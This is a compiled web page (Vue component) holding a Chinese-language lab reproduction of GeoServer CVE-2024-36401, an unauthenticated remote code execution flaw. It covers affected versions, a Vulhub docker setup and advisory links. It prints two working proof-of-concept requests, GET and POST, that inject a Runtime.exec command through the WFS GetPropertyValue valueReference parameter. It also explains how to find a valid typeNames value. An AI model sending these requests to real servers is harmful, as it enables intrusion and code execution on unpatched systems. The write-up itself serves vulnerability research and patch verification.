import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c as l,a as e,b as t,d as a,e as n}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),p=e("p",null,"GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。",-1),u=e("p",null,"在 GeoServer 2.25.1， 2.24.3， 2.23.5 版本及以前，未登录的任意用户可以通过构造恶意 OGC 请求，在默认安装的服务器中执行 XPath 表达式，进而利用执行 Apache Commons Jxpath 提供的功能执行任意代码。",-1),v=e("p",null,"参考链接：",-1),g={href:"https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w",target:"_blank",rel:"noopener noreferrer"},h={href:"https://tttang.com/archive/1771/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/Warxim/CVE-2022-41852",target:"_blank",rel:"noopener noreferrer"},f=n(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GeoServer ≤ 2.23.5
2.24.0 &lt;= GeoServer ≤ 2.24.3
2.25.0 &lt;= GeoServer ≤ 2.25.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 GeoServer 2.23.2 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，你可以在 <code>http://your-ip:8080/geoserver</code> 查看到 GeoServer 的默认页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704162257994.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,8),_={href:"https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv",target:"_blank",rel:"noopener noreferrer"},x=e("blockquote",null,[e("p",null,"No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests. 未提供公开 PoC，但已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 利用此漏洞。")],-1),w=e("code",null,"GetPropertyValue",-1),S={href:"https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst",target:"_blank",rel:"noopener noreferrer"},G=n(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#39;touch%20/tmp/awesome_poc1&#39;) HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704162941141.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>基于 POST 方法的 POC：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39;
 xmlns:topp=&#39;http://www.openplans.org/topp&#39;
 xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39;
 xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;&gt;
  &lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#39;touch /tmp/awesome_poc2&#39;)&lt;/wfs:valueReference&gt;
&lt;/wfs:GetPropertyValue&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704163007780.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>均触发 <code>java.lang.ClassCastException</code> 类型转换异常，命令执行成功。</p><p>进入容器验证 <code>touch /tmp/awesome_poc1</code> 和 <code>touch /tmp/awesome_poc2</code> 执行结果：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704163120678.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Payload 中的 typeNames 必须存在，例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以在 Web 页面中找到当前服务器中的所有 Types：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage?2&amp;filter=false
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704163921580.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function y(k,W){const i=s("ExternalLinkIcon");return o(),l("div",null,[d,p,u,v,e("ul",null,[e("li",null,[e("a",g,[t("https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv"),a(i)])]),e("li",null,[e("a",m,[t("https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w"),a(i)])]),e("li",null,[e("a",h,[t("https://tttang.com/archive/1771/"),a(i)])]),e("li",null,[e("a",b,[t("https://github.com/Warxim/CVE-2022-41852"),a(i)])])]),f,e("p",null,[t("在官方 "),e("a",_,[t("漏洞通告"),a(i)]),t(" 中提到可以找到漏洞相关的 WFS 方法：")]),x,e("p",null,[t("Vulhub 使用 "),w,t(" 来执行 xpath 表达式，参考 "),e("a",S,[t("官方文档"),a(i)]),t(" 构造两个 POC。基于 GET 方法的 POC：")]),G])}const A=r(c,[["render",y],["__file","GeoServer 属性名表达式前台代码执行漏洞 CVE-2024-36401.html.vue"]]);export{A as default};
